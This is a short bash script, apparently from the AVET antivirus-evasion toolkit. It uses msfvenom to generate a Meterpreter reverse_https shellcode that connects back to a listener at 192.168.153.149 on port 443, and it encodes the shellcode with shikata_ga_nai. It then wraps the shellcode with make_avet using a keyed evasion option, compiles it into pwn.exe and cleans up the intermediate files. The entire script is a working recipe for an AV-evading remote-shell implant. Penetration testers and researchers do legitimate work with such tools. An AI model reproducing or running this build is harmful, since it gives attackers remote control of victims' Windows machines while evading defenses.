#!/bin/bash          
. build/global_win32.sh
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > sc.txt
./make_avet -f sc.txt -k "somewhat.somewhere"
$win32_compiler -o pwn.exe avet.c -lws2_32
rm sc.txt && echo "" > defs.h